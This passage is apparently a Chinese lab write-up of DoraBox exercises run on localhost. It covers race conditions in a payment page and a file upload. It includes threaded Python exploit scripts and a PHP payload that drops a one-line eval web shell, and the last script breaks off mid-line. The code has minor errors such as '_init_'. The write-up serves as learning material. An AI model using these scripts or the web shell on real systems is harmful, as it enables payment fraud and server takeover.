&lt;li&gt;输入 1，发现限制在当前目录，但是不影响要用的文件，所以也是直接包含就可以了&lt;img src=&#34;dorabox_filein004.png&#34; alt=&#34;&#34;&gt;&lt;img src=&#34;dorabox_filein003.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-18&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;…/ 应该可以突破把&lt;/p&gt;
&lt;h1 id=&#34;条件竞争-支付&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#条件竞争-支付&#34;&gt;#&lt;/a&gt; 条件竞争 - 支付&lt;/h1&gt;
&lt;p&gt;靶场出了点问题，页面报 php 语法错&lt;/p&gt;
&lt;p&gt;但是语法并没有出错，百度了说是 php 版本的问题，但是我基本每个版本都试过且重启了，但是没有解决&lt;/p&gt;
&lt;p&gt;不过反正这个题要写脚本，我也不太会，干脆跟着把 poc 撸了一遍&lt;/p&gt;
&lt;h2 id=&#34;过程-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-19&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; threading&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; queue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    三个变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    url：要测试的网站地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    threads：线程数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    q：调用queue构造方法，对列队大小不设限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://localhost/dorabox/race_condition/pay.php&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;threads=&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q=queue.Queue()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 在列队中加入50个元素,0-49&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    q.put(i)   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 定义post函数，发50个一块钱&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;post&lt;/span&gt;():&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 当q里面还有元素时,就获取元素，发送一个post请求支付一块钱&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; q.empty():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        q.get() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# Requests以form表单形式发送post请求，支付输入框name是money嘛&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# data = &amp;#123;&amp;#x27;key1&amp;#x27;:&amp;#x27;value1&amp;#x27;,...&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r = requests.post(url, data = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;money&amp;#x27;&lt;/span&gt; : &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.encoding = &lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;一个python文件通常有两种使用方法,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 第一是作为脚本直接执行，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 第二是 import 到其他的 python 脚本中被调用（模块重用）执行。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 因此if __name__ == &amp;#x27;main&amp;#x27;: 的作用就是:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 控制这两种情况执行代码的过程，在if __name__ == &amp;#x27;main&amp;#x27;: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 每个python模块（python文件）都包含内置的变量 __name__，当该模块被直接执行的时候，__name__ 等于文件名（包含后缀 .py ）；如果该模块 import 到其他模块中，则该模块的 __name__ 等于模块名称（不包含后缀.py）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 而“__main__” 始终指当前执行模块的名称（包含后缀.py）。进而当模块被直接执行时，__name__ == &amp;#x27;__main__&amp;#x27; 结果为真。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; 那其实就是主函数呗，程序运行入口，不过也有点区别嗷&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__==&lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 用25个线程，分别发50个一块钱&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(threads)：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t = threading.Thread(target=post) &lt;span class=&#34;comment&#34;&gt;# 目标对象是post函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.start() &lt;span class=&#34;comment&#34;&gt;# 开始执行线程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;总结-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-19&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;python 代码写的时候，总是爱打分号唉&lt;br&gt;
感觉大家写脚本或者一些小工具，都喜欢用 python，有点意思&lt;/p&gt;
&lt;p&gt;这里是看代码的时候找资料看见的（后来才发现 python 自带.chw api，不过英文的阅读起来也有点费时间就是了）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Queue 是 python 标准库中的线程安全的列队 (FIFO) 实现&lt;br&gt;
提供了一个适用于多线程编程的先进先出的数据结构，即列队&lt;br&gt;
用来在生产者和消费者线程之间的信息传递&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;class Queue.Queue(maxsize=0)&lt;br&gt;
 maxsize 是个整数，指明了列队中能存放的个数上限。&lt;br&gt;
一旦达到上限，插入会导致阻塞，直到列队中的数据被消费掉。&lt;br&gt;
如果 maxsize 小于或者等于 0，列队大小没有限制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Queue,deque,queue 对比：queue 是多线程中的使用的栈，但是 Python 解释器有一个全局解释器锁 (PIL)，&lt;br&gt;
导致每个 Python 进程中最多同时运行一个线程，&lt;br&gt;
因此 Python 多线程程序并不能改善程序性能，不能发挥多核系统的优势。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;multiprocessing.Queue 是 Python 2.6 引入的用来实现多进程的一种高性能栈。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;collections.deque 是为了高效实现插入和删除操作的双向列表，适合用于队列和栈。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;queue 实例方法：&lt;br&gt;
Queue.empty (): 判断队列是否为空。和上面一样注意&lt;br&gt;
 Queue.full (): 判断是否满了。和上面一样注意&lt;br&gt;
 Queue.put (item, block=True, timeout=None): 往队列里放数据。如果满了的话，blocking = False 直接报 Full 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能存入，报 Full 异常。&lt;br&gt;
Queue.put_nowait (item): 往队列里存放元素，不等待&lt;br&gt;
 Queue.get (item, block=True, timeout=None): 从队列里取数据。如果为空的话，blocking = False 直接报 empty 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能读取，报 empty 异常&lt;br&gt;
 Queue.get_nowait (item): 从队列里取元素，不等待两个方法跟踪入队的任务是否被消费者 daemon 进程完全消费&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;条件竞争-上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#条件竞争-上传&#34;&gt;#&lt;/a&gt; 条件竞争 - 上传&lt;/h1&gt;
&lt;p&gt;看源码顺序：文件上传上来，检查后缀，后缀不在允许列表里，删除文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_jz_upload001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-20&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;p&gt;竞争的地方，是先删除还是先执行，关键就在于赶在删除之前执行上传的文件。&lt;br&gt;
这是我们上传的文件内容，新建一个 info.php 文件，里面写入一句话木马。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption&gt;&lt;span&gt;payload&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; fputs(fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;info.php&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;), &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php @eval($_POST[&amp;quot;key&amp;quot;]);?&amp;gt;&amp;#x27;&lt;/span&gt;); &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过并发可以实现在上传成功未执行到删除代码的时候，访问执行，生成 info.php。&lt;/p&gt;
&lt;p&gt;脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; threading&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 父类 threading.Thread&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;RaceCondition&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;threading.Thread&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;_init_&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        threading.Thread._init_(self)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.url = &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://localhost/dorabox/race_condition/key.php&amp;#x27;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# 马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.uploadUrl = &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://localhost/dorabox/race_condition/upload.php&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;# 搞它&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 获取上传的马，就是解析执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;_get&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;try to call uploaded file...&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r = requests.get(self.url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; r.status_code == &lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;: &lt;span class=&#34;comment&#34;&gt;# 搞到成功就退出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;create file info.php success.&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            os._exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 传马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;_upload&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload file...&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        file = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;myfile&amp;#x27;&lt;/span&gt; : &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;attack.php&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)&amp;#125; &lt;span class=&#34;comment&#34;&gt;#key value的数据，我还以为是啥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        requests.post(self.uploadUrl, files=file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 一直搞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;run&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):  &lt;span class=&#34;comment&#34;&gt;# 其实就外面那个循环不就好了，为啥还要再写一个for啊&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                self._upload()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                self._get()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    threads = &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span 